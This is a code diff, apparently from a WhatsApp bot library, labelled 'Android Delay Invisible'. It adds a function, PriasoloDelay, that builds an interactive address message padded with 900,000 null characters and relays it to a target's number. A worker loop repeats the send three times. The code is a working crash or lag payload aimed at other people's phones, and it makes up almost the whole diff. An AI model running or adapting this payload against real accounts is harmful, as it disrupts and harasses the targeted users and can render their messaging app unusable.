@@ -4812,7 +4812,7 @@ Description : Android Delay Invisible
             
             for (let i = 0; i < 3; i++) {
                 try {
-                   // await PriaSoloBlank(sock, target);
+                    await PriasoloDelay(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -5495,6 +5495,31 @@ async function VogueBuldo(sock, target) {
   }
   await sleep(1500)
 }
+}
+
+async function PriasoloDelay(sock, target) {
+  var msg = generateWAMessageFromContent(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "Pria Solo",
+            format: "EXTENSION"
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
+            version: 3
+          }
+        }
+      }
+    }
+  }, { userJid: target });
+
+  await sock.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
 }
 
 
